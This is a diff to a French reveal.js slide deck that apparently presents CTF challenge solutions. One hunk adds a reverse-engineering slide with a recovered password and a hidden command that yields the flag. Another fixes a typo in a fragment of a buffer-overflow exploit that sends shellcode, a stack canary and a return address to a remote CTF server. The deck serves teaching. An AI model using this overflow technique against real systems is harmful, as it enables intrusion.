@@ -16,6 +16,7 @@
 
 		<link rel="stylesheet" href="css/reveal.css">
 		<link rel="stylesheet" href="css/theme/black.css" id="theme">
+		<link rel="stylesheet" href="https://raw.githubusercontent.com/hakimel/reveal.js/master/css/print/pdf.css" id="printpdf">
 
 		<!-- Code syntax highlighting -->
 		<link rel="stylesheet" href="lib/css/zenburn.css">
@@ -280,6 +281,19 @@
             </script>
         </section>
 
+				<section data-markdown>
+            <script type="text/template">
+            ## Reverse engineering
+
+            * Notre mot de passe : "Tje737"
+            * Le 'f' est filtré dans le path du fichier à télécharger
+            * Il y a une commande secrète (pas dévoilée par HELP) : RDF
+            * RDF nous envoie le flag
+
+            </script>
+
+				</section>
+
 				<section>
           <h1>Exploit 100</h1>
 					<h2>Precision</h2>
@@ -382,7 +396,7 @@ conn = remote('54.173.98.115', 1259)
 ret_addr = conn.recv().split(' ')[1]
 ret_addr = struct.pack('<I', int(ret_addr, 16))
 
-exploit = shellcode + 'A' * (LEN_EXPLOIT - len(shellcode)) k\\
+exploit = shellcode + 'A' * (LEN_EXPLOIT - len(shellcode)) \\
           + CANARY + 'B' * 12 + ret_addr
 
 conn.send_raw(exploit)
